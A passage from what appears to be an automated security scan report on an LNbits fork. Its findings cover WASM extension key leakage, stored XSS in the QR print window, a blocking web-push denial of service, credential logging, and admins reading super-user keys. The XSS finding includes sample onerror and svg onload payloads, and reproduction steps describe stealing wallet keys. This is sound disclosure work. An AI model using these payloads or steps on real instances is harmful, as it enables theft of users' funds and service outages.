   navigation.replace lets the frame set the parent document URL to any path under /ext/<id>/, so the frame chooses the base directory used by the relative fetch.
4. [lnbits/core/wasm\_ext/routes/ui.py:332–336](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/routes/ui.py#L332-L336)
   UI route paths are only required to start with '/'; the wrapper GET route is registered at `/ext{path}`, so an extension may declare a UI route such as `/myext/api/v1/ext/myext/{a}` that lands exactly where the document-relative fetch resolves.
5. [lnbits/core/wasm\_ext/routes/ui.py:106–144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/routes/ui.py#L106-L144)
   serve_private_wasm_extension_page authenticates via check_account_exists (cookie accepted by check_access_token) and renders the wrapper with `user.json()` — the full User object.
6. [lnbits/templates/base.html:105](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/base.html#L105)
   wasm_extension.html extends base.html, which embeds the User JSON into the page: `window.g.user = ... JSON.parse({{ user | tojson | safe }})`. No <base href> is set, so relative fetches resolve against the document URL.
7. [lnbits/core/models/wallets.py:119–124](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L119-L124)
   User.wallets serialises BaseWallet, which includes `adminkey` and `inkey` for every wallet of the user.
8. [lnbits/core/wasm\_ext/routes/api.py:394–396](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/routes/api.py#L394-L396)
   _path_template_pattern anchors the pattern on the full root path (`^/api/v1/ext/<id>/...$`), which is correct for the validated URL but is never applied to the URL fetch() actually requests.

## Impact
Discloses adminkey/inkey of every wallet of each user who opens the extension page (confidentiality HIGH). Admin keys authorise outgoing payments and wallet changes via the public API, so funds of all affected users can be spent without any WASM permission prompt (integrity HIGH). No availability impact.

## Reproduction steps
1. Attacker is the author of a WASM extension (or anyone able to alter one in the admin's install path). The admin installs it; the victim user enables it and opens its page (routine). The frame posts an `api` request with a slash-less path matching one of the extension's declared API routes; the parent fetches document-relative with the session cookie, hitting a wrapper route the extension itself declared under /ext, and returns the page HTML containing the user's wallet admin/invoice keys, which the frame exfiltrates through the extension's own API/storage, approved http.request origin or websocket relay. No LNbits credentials are needed by the attacker; no browser defence (sandbox, CSP) is defeated since the parent performs the request. The install step is an attack requirement, not a privilege.

## Recommended fix
1. The bridge authorises a URL resolved against the origin root but issues the request with the raw string, which fetch() resolves against the document base URL; the two differ for paths lacking a leading slash. Fix criteria: The request issued by the `api` action must be exactly the URL that was validated (e.g. fetch the normalised absolute href, and/or reject paths that do not begin with '/'). Verify that a frame message with path 'api/v1/ext/<id>/x' is either rejected or fetches '/api/v1/ext/<id>/x' regardless of the current document URL, and never a `/ext/...` wrapper page.
2. The wrapper route accepts arbitrary extension-declared UI paths under /ext, letting an extension place an HTML page carrying the user's wallet keys at a location reachable by the mis-resolved fetch. Fix criteria: Restrict declared UI route paths to the extension's own prefix (`/ext/<id>/...`) and avoid embedding wallet secrets in WASM wrapper pages; verify a UI route declared as '/<id>/api/v1/ext/<id>/{a}' is rejected at install.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper authorization
**CWE:** [CWE-706](https://cwe.mitre.org/data/definitions/706.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257521

---

# Admin-editable QR logo string written unescaped via document.write into a same-origin print window (stored XSS, admin -> super user)

## Details
`lnbits-qrcode.printQrCode()` (lnbits/static/js/components/lnbits-qrcode.js:47-81) builds a complete HTML document in a template literal and writes it with `document.write` into a window it just opened with `window.open('', '_blank')`. That window is about:blank, so it inherits the LNbits origin and keeps a same-origin `window.opener` to the authenticated page. The literal embeds `this.logo` verbatim inside `<img src="${this.logo}">`. `logo` defaults to `window.g.settings.qrLogo`, which is `settings.lnbits_qr_logo` exposed through `PublicSettings` (settings.py:1479) and inlined into every page by base.html:89.

`lnbits_qr_logo` is a free-form `str` in `ThemesSettings` (settings.py:329) with no validator. ThemesSettings is a mixin of `EditableSettings`, and `PUT /admin/api/v1/settings` (admin_api.py:104-110) is gated by `check_admin`, so any admin - not only the super user - can set it (the admin UI's Site Customization form exposes the same field).

The only transformation on the way to storage is `Connection.rewrite_values` (db.py:147-153), applied by `db.execute` in `set_settings_field` (crud/settings.py:118-128) to the JSON-encoded value: it deletes complete `<...>` pairs and `&...;` entities. That removes a literal `<script>...</script>`, but it is not an attribute escape: a value such as

    x" onerror="fetch('/users/api/v1/balance',{method:'PUT',headers:{'content-type':'application/json'},body:JSON.stringify({id:'<attacker wallet>',amount:100000000})})

or an unterminated tag that the template's own `">` completes, e.g. `"><svg onload=...//`, is stored unchanged (no `<`-`>` pair inside the string), is read back into the live settings by `update_cached_settings`, and is served to every browser as `g.settings.qrLogo`.

When any user opens a QR dialog that exposes the Print button and clicks it, the written markup is parsed by the new window's HTML parser: the breakout yields `<img src="x" onerror="...">` (handler runs when the image fails to load) or `<img src=""><svg onload="...">` (load event dispatched when the document finishes loading at `document.close()`), executing the admin's JavaScript on the LNbits origin inside the victim's session. The API accepts the session cookie (`cookie_access_token`, decorators.py:253-257), so same-origin `fetch()` calls - from the print window or through `window.opener` - are authenticated as the victim, and `opener.g.user` exposes the victim's wallet admin keys.

The decisive victim is the super user: this crosses the admin -> super-user boundary that the project's own docs draw (docs/guide/super_user.md: admins cannot change the funding source, credit/debit accounts or restart the server; user_roles.md says the same). With the super user's session the script can credit arbitrary balance to the attacker's wallet (`PUT /users/api/v1/balance`, check_super_user, user_api.py:398-405 - unbacked sats spendable from the funding source), read the on-chain master key (`GET /admin/api/v1/onchain/key`), reset other users' passwords and toggle admin status (`/users/api/v1/user/{id}/reset_password`, `/admin`), wipe settings (`DELETE /admin/api/v1/settings`) or restart the server (`/admin/api/v1/restart`). It also takes over any other admin's or user's session that prints a QR code.

Reachability condition: the Print button is rendered only where `lnbits-qrcode` receives `print` (components/lnbits-qrcode.vue:48). In this tree that is only `lnbits-qrcode-lnurl` (components.vue:660), a shared component shipped for extension LNURL pages; no core page instantiates it. The finding therefore holds on an instance where an installed extension UI uses `lnbits-qrcode-lnurl` or passes `print` to `lnbits-qrcode` (the LNbits-org LNURL-pay and withdraw extensions do; their code is outside this repository). The same unescaped interpolation applies to a `logo` prop passed by a caller, so an extension binding user-controlled data to `logo` inherits the bug.

Sibling admin-controlled theme sinks reviewed and not part of this finding: lnbits_default_bgimage -> CSS url(), lnbits_custom_logo -> <img :src> (Vue binding, safe), lnbits_default_reaction -> window[name]() (zero-argument global call), and generic.py:37 redirecting to lnbits_qr_logo (a different sink).

## Evidence
1. [lnbits/static/js/components/lnbits-qrcode.js:47–80](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-qrcode.js#L47-L80)
   printQrCode opens window.open('', '_blank') (about:blank, inherits the LNbits origin, keeps window.opener) and document.write()s a template literal containing <img src="${this.logo}"> with no escaping; attribute breakout and event-handler attributes in the written markup execute in the new window with the victim's origin. This is the code the fix must change.
2. [lnbits/static/js/components/lnbits-qrcode.js:35–38](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-qrcode.js#L35-L38)
   The logo prop defaults to window.g.settings.qrLogo (globals.js: settings = SETTINGS), i.e. the admin-set lnbits_qr_logo string, so every printed QR code uses the admin's value unless the caller passes its own.
3. [lnbits/core/views/admin\_api.py:104–109](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L104-L109)
   PUT /admin/api/v1/settings takes UpdateSettings (an EditableSettings) under Depends(check_admin): any admin, not only the super user, can set lnbits_qr_logo. The admin UI exposes the same field (components/admin/site_customisation.vue:175).
4. [lnbits/settings.py:329](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L329)
   lnbits_qr_logo is a plain str field of ThemesSettings with no URL validation; EditableSettings.validate_editable_settings (settings.py:1119-1131) covers only list fields.
5. [lnbits/core/crud/settings.py:118–127](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/settings.py#L118-L127)
   set_settings_field stores json.dumps(value) through db.execute, whose rewrite_values (db.py:147-153) deletes complete '<...>' pairs and '&...;' entities from the bound string. This removes a literal <script>...</script> but leaves attribute breakouts ('x" onerror="...') and an unterminated opening tag that the template's own '">' completes ('"><svg onload=...//') intact; update_cached_settings then loads this stored value into the live settings object.
6. [lnbits/db.py:147–153](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L147-L153)
   rewrite_values' regex '<.*?>|&(...);' is the only transformation applied to the stored setting; it is not an HTML-attribute escape and does not neutralise quote-based breakout.
7. [lnbits/settings.py:1479](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1479)
   PublicSettings.from_settings copies lnbits_qr_logo to qrLogo, which the template renderer places in SETTINGS, inlined by base.html:89 (|tojson|safe keeps the string's characters intact) into every page as window.g.settings.
8. [lnbits/templates/components.vue:660](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components.vue#L660)
   lnbits-qrcode-lnurl renders <lnbits-qrcode ... print="true">, the only in-tree instantiation that shows the Print button; it is a shared component shipped for extension LNURL pages (no core page passes print), so the sink is reached through an installed extension UI that uses it or passes print itself.
9. [lnbits/core/views/user\_api.py:398–404](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L398-L404)
   PUT /users/api/v1/balance (check_super_user) credits or debits any wallet; with the super user's session the injected script can call it, which docs/guide/super_user.md and user_roles.md reserve to the super user alone. GET /admin/api/v1/onchain/key, /user/{id}/reset_password, /user/{id}/admin, DELETE settings and /api/v1/restart are likewise super-user-only.
10. [lnbits/decorators.py:253–256](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L253-L256)
   API auth accepts cookie_access_token, so same-origin fetch() from the print window (or via window.opener) authenticates as the victim without needing to read a token.

## Impact
Script executes on the LNbits origin in the victim's authenticated session. For a super-user victim the admin gains the super-user-only operations the docs reserve: crediting any wallet (PUT /users/api/v1/balance, user_api.py:398-405 - unbacked funds), reading the on-chain master key (GET /admin/api/v1/onchain/key), resetting user passwords and toggling admin status, plus the super user's own wallet admin keys from opener.g.user - confidentiality and integrity HIGH, a breach of the admin -> super-user boundary and of funds integrity. DELETE /admin/api/v1/settings (reset_core_settings) and GET /admin/api/v1/restart (admin_api.py:251-266) are also super-user-only and let the script wipe configuration or restart the service: availability LOW. For other victims the admin obtains their wallet admin keys and session.

## Reproduction steps
1. A non-super admin sets lnbits_qr_logo via PUT /admin/api/v1/settings (check_admin) or the Site Customization form to a string that closes the img src attribute and adds an event-handler attribute, or an unterminated <svg onload=...// completed by the template; rewrite_values' tag stripping does not touch either shape. The value is served to every page as g.settings.qrLogo. Any user - including the super user - who opens a QR dialog exposing the Print button and clicks Print runs the script in a same-origin window with opener and cookie access to their session. Network vector, no race or guesswork (AC:L); the attack requires a page that passes print to lnbits-qrcode, which in this tree is only the shared lnbits-qrcode-lnurl component used by extension UIs, and a victim click on Print (AT:P, UI:A); the attacker must hold an admin account (PR:H).

## Recommended fix
1. printQrCode interpolates an untrusted string into HTML passed to document.write on a same-origin window without escaping, so attribute breakout and event-handler injection are possible. Fix criteria: The print document must be built with DOM APIs (createElement/setAttribute on the new document) or with the logo value HTML-attribute-escaped and restricted to http(s)/site-relative/data:image URLs; alternatively render the print view in a sandboxed or opaque-origin context (noopener, sandbox). Verify that a qrLogo value containing a double quote followed by an event-handler attribute, and one containing an unterminated <svg onload, print without executing script.
2. lnbits_qr_logo (and sibling image-URL theme settings) accept arbitrary strings from any admin and are published to all users as trusted UI configuration; the only storage-time filter (rewrite_values) strips complete tags, not attribute-breaking quotes. Fix criteria: Image/URL theme settings must be validated server-side on update as http(s) or site-relative URLs (no quotes, whitespace, angle brackets or non-URL schemes), so admin-supplied values cannot carry markup or attributes. Verify PUT /admin/api/v1/settings rejects a lnbits_qr_logo containing '" onerror=' and '"><svg'.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257520

---

# Web-push delivery to a user-chosen endpoint blocks the asyncio event loop with no timeout

## Details
Every payment notification for a wallet runs `dispatch_payment_notification` -> `send_payment_notification` -> `send_payment_push_notification`, which for each web-push subscription of the wallet owner calls `pywebpush.webpush()` directly from the coroutine (lnbits/core/services/notifications.py:410-424). LNbits uses pywebpush's synchronous API (the project's own unit test patches `lnbits.core.services.notifications.webpush` with a plain synchronous mock and the code does not await it), passes no `timeout`, and does not move the call off the loop with `asyncio.to_thread`. Assumption on the pinned dependency (pywebpush 2.2.1, uv.lock): `webpush(..., timeout=None)` issues `requests.post(endpoint, ..., timeout=None)`, which waits indefinitely for the remote side. While it waits, the uvicorn worker's single asyncio event loop is frozen: no HTTP requests are served, websockets stop, scheduler/funding-source streams and payment processing stall.

The destination is attacker-chosen. `POST /api/v1/webpush` (webpush_api.py:32-53, any account passing `check_account_id_exists`) stores `subscription['endpoint']` and the raw subscription JSON verbatim: any scheme/host/port, no allow-list of push services, no per-user limit. An attacker registers a subscription (with syntactically valid p256dh/auth keys, trivially generated) whose endpoint is a server they run that accepts the TCP connection and never completes the HTTP response. They then pay an invoice of one of their own wallets from another of their wallets: the internal settlement path (payments.py:863-870) notifies the sender via `create_task(send_payment_notification(...))` (notifications.py:309-312) and enqueues the receiver's payment on `internal_invoice_queue`, whose core listener (`dispatch_payment_notification`, app.py:583; task_manager.py:402-410) runs on the same loop. Internal payments carry no fee reserve (settings.py:390-392) and the service fee ignores internal payments by default, so once a wallet holds any balance the trigger is free and repeatable. The listener blocks on the tarpit for as long as the attacker holds the socket open; every other user of the instance is locked out until the connection dies or the process is restarted, after which the attacker repeats with another self-payment. Many subscriptions (no cap) make even a merely slow endpoint sufficient because sends are sequential.

The send path is always live in production: `check_webpush_settings()` (services/settings.py:17-40, called at startup from app.py:103) auto-generates a VAPID key pair when none is configured, so no operator action is needed to enable it. The sibling payment-webhook sender in the same module (`_post_webhook`, notifications.py:470-503) uses an async httpx client with `timeout=40`, and the email sender (:239) wraps blocking smtplib in `asyncio.to_thread`; neither safeguard is applied to the push send.

Root cause: a synchronous network call to an untrusted, user-chosen destination is executed on the asyncio event loop with no timeout (CWE-1088). The destination-control (SSRF) aspect of the same endpoint is recorded separately as webpush-subscription-endpoint-unvalidated-blind-ssrf; this record is the blocking/no-timeout defect.

## Evidence
1. [lnbits/core/services/notifications.py:410–423](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L410-L423)
   send_push_notification calls pywebpush.webpush(...) synchronously inside a coroutine with no `timeout` argument and no asyncio.to_thread/run_in_executor; pywebpush's sync API performs the HTTP POST with the blocking `requests` library (pywebpush 2.2.1 per uv.lock; default timeout=None). This is the code the fix must change.
2. [lnbits/core/services/notifications.py:392–407](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L392-L407)
   send_payment_push_notification loads every stored subscription of the wallet owner and awaits send_push_notification for each, sequentially, on every payment notification; one tarpit endpoint stalls the loop per payment and N subscriptions multiply the stall.
3. [lnbits/core/views/webpush\_api.py:32–52](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/webpush_api.py#L32-L52)
   Any authenticated account (check_account_id_exists) may store a subscription; `endpoint` and the raw subscription JSON are stored verbatim with no scheme/host validation and no per-user cap.
4. [lnbits/task\_manager.py:402–409](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L402-L409)
   Invoice listeners (dispatch_payment_notification is registered as the core listener in app.py:583) are awaited as asyncio tasks on the single uvicorn event loop (create_permanent_task -> create_task), so a blocking call inside them freezes every request handler, websocket and background task in the process.
5. [lnbits/core/services/payments.py:863–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L863-L869)
   Internal payments (between two wallets of the same user) settle synchronously, notify the sender via create_task(send_payment_notification) and enqueue the receiver's payment on internal_invoice_queue; with fee_reserve(internal)=0 (settings.py:390-392) and service fee ignored for internal payments by default, the trigger is free and repeatable once a wallet holds any balance.
6. [lnbits/core/services/settings.py:17–39](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/settings.py#L17-L39)
   check_webpush_settings() (called at startup from app.py:103) generates and persists a VAPID key pair when none is configured, so the pywebpush send path is live in every production deployment without operator action.
7. [lnbits/core/services/notifications.py:470–502](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L470-L502)
   Contrast: the sibling payment-webhook sender in the same module uses httpx.AsyncClient with timeout=40 (and the email sender at :239 wraps blocking smtplib in asyncio.to_thread), showing the project's own standard for outbound I/O to user-chosen destinations; none of it is applied to the push send.

## Impact
Complete denial of service of the LNbits process (API, UI, payment processing) for as long as the attacker's socket stays open; payments in flight are not settled/notified while the loop is blocked. No confidentiality or integrity impact.

## Reproduction steps
1. A registered user (registration open by default) POSTs a subscription JSON whose endpoint points at a host they run that accepts the connection and never answers, then pays an invoice from one of their wallets to another (free: internal fee reserve is 0 and service fee ignores internal payments by default; only a one-time deposit of any amount is needed so a balance exists). The core invoice listener and the sender-side create_task both call webpush() on the main loop with no timeout and the process stops serving everyone. Repeatable after each restart; no race, no configuration dependency (VAPID key is auto-generated at startup).

## Recommended fix
1. Synchronous pywebpush/requests network I/O is executed on the asyncio event loop without a timeout. Fix criteria: Push delivery runs off the event loop (thread/executor or an async HTTP client) with a bounded connect/read timeout, so an unresponsive endpoint cannot delay request handling; a tarpit endpoint must leave the API responsive and fail the single notification after the timeout.
2. Subscriptions are unbounded per user and endpoints are unvalidated, amplifying the blocking send. Fix criteria: Cap the number of subscriptions per account and restrict endpoints to https URLs of recognised push services (or at least public, non-loopback hosts) so the number and nature of outbound sends per payment is bounded.

---
**Severity:** HIGH
**Status:** Open
**Category:** Denial of Service
**CWE:** [CWE-1088](https://cwe.mitre.org/data/definitions/1088.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257518

---

# Settings import dumps funding, SSO, DB and provider credentials to stderr when admin UI is disabled

## Details
`lnbits/settings.py` ends with a "printing environment variable for debugging" block (lines 1596-1601): when `lnbits_admin_ui` is False it iterates `settings.dict(exclude_none=True, exclude={"auth_secret_key", "totp_encryption_key"})` and logs every key/value with `logger.debug`.

Two facts make this a credential leak rather than a harmless debug aid:

1. It runs at import time of `lnbits.settings`, which the CLI entry point (`lnbits/server.py:10`) and every other module import before `create_app()` calls `configure_logger()` (`lnbits/app.py:171`). Until `configure_logger()` executes `logger.remove()`, loguru's built-in default handler is active: stderr at level DEBUG. So the dump is emitted even when `DEBUG=false`; the `settings.debug` level selection never applies to it.

2. The exclude list covers only two fields. Everything else in `Settings` is printed verbatim, including: `lnd_rest_macaroon`/`lnd_grpc_admin_macaroon`/`lnd_admin_macaroon`, `clnrest_pay_rune`/`clnrest_readonly_rune`, `eclair_pass`, `alby_access_token`, `blink_token`, `zbd_api_key`, `strike_api_key`, `opennode_admin_key`, `lnpay_admin_key`, `phoenixd_api_password`, `phoenixd_mnemonic`, `boltz_mnemonic`, `spark_l2_mnemonic`, `breez_greenlight_seed`, `breez_liquid_seed`, `nwc_pairing_url` (contains the NWC secret), `fake_wallet_secret`, `google/github/keycloak/oidc_client_secret`, `stripe_api_secret_key`, `stripe_webhook_signing_secret`, `paypal_client_secret`, `square_access_token`, `revolut_api_secret_key`, `lnbits_email_notifications_password`, `lnbits_telegram_notifications_access_token`, `lnbits_nostr_notifications_private_key`, `lnbits_webpush_privkey`, `lnbits_ext_github_token`, `lnbits_database_url` (Postgres URL with password) and `super_user` when set via env. Only `lnbits_onchain_master_key` is a `SecretStr` and therefore masked.

The trigger, `LNBITS_ADMIN_UI=false`, is a documented configuration (docs/guide/admin_ui.md:119-122, "Disable Admin UI") used precisely by operators who manage all funding credentials through `.env`. Stderr of the service is captured by `docker logs`, journald, supervisor or systemd and is routinely shipped to log aggregation systems whose readers are not entitled to the `.env` file or the data folder. Anyone with read access to those logs obtains the node's spending credentials, the DB password (hence all wallet admin keys), SSO secrets (hence the ability to mint SSO logins for the admin per the existing admin-settings finding), and potentially the super-user id.

## Evidence
1. [lnbits/settings.py:1595–1601](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1595-L1601)
   At module import, when lnbits_admin_ui is False, every field of settings.dict(exclude_none=True) is written with logger.debug, excluding only auth_secret_key and totp_encryption_key. Funding macaroons/runes/API keys/mnemonics, SSO client secrets, fiat provider secrets, SMTP/Telegram/Nostr credentials, lnbits_ext_github_token, lnbits_database_url and super_user are all included.
2. [lnbits/settings.py:1583–1590](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1583-L1590)
   The Settings object is populated from environment and .env at import time, so the dump contains the operator's real credentials.
3. [lnbits/utils/logger.py:57–61](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/logger.py#L57-L61)
   configure_logger() is what removes loguru's default handler (logger.remove()) and applies the INFO/DEBUG level choice from settings.debug; until it runs, loguru's pre-configured default handler (stderr, level DEBUG in loguru 0.7.3) emits DEBUG records regardless of settings.debug. No LOGURU_* environment override or other logger.remove() exists in production code.
4. [lnbits/app.py:171](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L171)
   configure_logger() is only invoked inside create_app(), the sole call site, long after lnbits.settings has been imported.
5. [lnbits/server.py:10](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L10)
   The `lnbits` console-script entry point (pyproject [project.scripts]; Dockerfile CMD; Nix ExecStart) imports lnbits.settings first, so the dump happens on the supervisor process's stderr before any logger configuration in every normal start.
6. [lnbits/commands.py:43](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/commands.py#L43)
   The `lnbits-cli` entry point also imports lnbits.settings at module level and never calls configure_logger(), so every CLI invocation repeats the credential dump to stderr.
7. [lnbits/settings.py:1332](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1332)
   lnbits_admin_ui is a ReadOnlySettings field (default True), so the trigger is the documented env-only LNBITS_ADMIN_UI=false operating mode (docs/guide/admin_ui.md 'Disable Admin UI'), in which operators keep all funding credentials in .env.
8. [lnbits/settings.py:1156–1161](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1156-L1161)
   Only lnbits_onchain_master_key is typed SecretStr (and so masked by str()); every other credential field is a plain str and is printed verbatim.
9. [lnbits/settings.py:551–715](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L551-L715)
   Funding-source credential fields (lnd macaroons, CLN runes, eclair password, Alby/Blink/ZBD/Strike/OpenNode/LNPay keys, phoenixd/boltz/spark mnemonics, breez seeds, NWC pairing URL) are plain str fields in the dumped model.

## Impact
Disclosure of the database URL/password, funding credentials, fiat provider and SSO secrets gives full read access to all LNbits data (wallet keys, account hashes) and the ability to spend any wallet or alter records; availability impact is incidental. Subsequent-system impact: The dumped values include admin macaroons, pay runes, custodial API tokens and wallet mnemonics/seeds for the operator's Lightning node or hosted account, i.e. direct control of funds outside LNbits.

## Reproduction steps
1. Requires the non-default but documented LNBITS_ADMIN_UI=false deployment mode (env-only ReadOnlySettings field). The leak happens unconditionally at every process start of `lnbits` and every `lnbits-cli` invocation, independent of DEBUG, because the dump runs at import before configure_logger() replaces loguru's default handler. Assumption: loguru 0.7.3 (pinned in uv.lock) installs its documented default sink on sys.stderr at level DEBUG at import; no LOGURU_* override exists in the repository. The attacker needs read access to the service's stderr stream (docker logs, journald, log aggregator) - an operational position distinct from access to .env or the data folder. No user interaction.

## Recommended fix
1. The import-time debug dump serialises the full settings model, excluding only two keys, so every credential field is written to the log. Fix criteria: No credential-bearing setting (funding, fiat, SSO, notification, DB URL, tokens, mnemonics, super_user) is ever written to any log sink. Either remove the dump or restrict it to an explicit allow-list of non-sensitive keys and verify by starting with LNBITS_ADMIN_UI=false and real-looking secrets that none appear in stderr.
2. Secrets are modelled as plain str fields, so any str()/dict() of the settings exposes them; the dump also runs before configure_logger so the configured log level cannot suppress it. Fix criteria: Credential fields are typed/marked as secrets so generic serialisation masks them, and any diagnostic output of settings happens only after logger configuration and only at an explicitly enabled debug level.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sensitive information in log
**CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257419

---

# Users API lets any admin read the super user's wallet admin/invoice keys

## Details
The users admin router is mounted unconditionally (core/__init__.py:53) with `Depends(check_admin)`, i.e. any account in `lnbits_admin_users` with a password. Its read routes `GET /users/api/v1/user/{user_id}` (user_api.py:82-90) and `GET /users/api/v1/user/{user_id}/wallet` (272-278) return the target's wallets through `copy_with_keys(keep=can_write)`; `check_api_write_access` (decorators.py:403-418) returns True for every non-ACL session token, so `adminkey` and `inkey` are returned unmasked. Neither route excludes `settings.super_user` as a target, whereas every write route in the same file does (update 135-139, delete 171-175, deactivate 242-246, delete-all-wallets 354-358, delete-wallet 386-390) and impersonating any admin is refused (auth_api.py:213-217). `super_user` lives in `EnvSettings` (settings.py:1174), so an admin cannot reach super-user status through the settings API; the accounts list (`AccountOverview` serialises `is_super_user`, users.py:196) tells the admin which id is the super user, and the shipped users page offers the wallets button for that row too (templates/pages/users.vue:704) with ungated copy-admin-key/copy-invoice-key buttons (users.vue:96,107).

Attack: admin A calls `GET /users/api/v1/user/<super_user_id>/wallet` and obtains the admin key of every wallet the super user owns (deleted ones included); `POST /api/v1/payments` with that key as `X-API-KEY` (`require_base_invoice_key`, admin key type, `out: true`) pays an invoice A controls from the super user's balance. The same router also lets A create wallets on the super user's account (281-294), undelete the super user's deleted wallets (325-345) and set their lightning address (297-322).

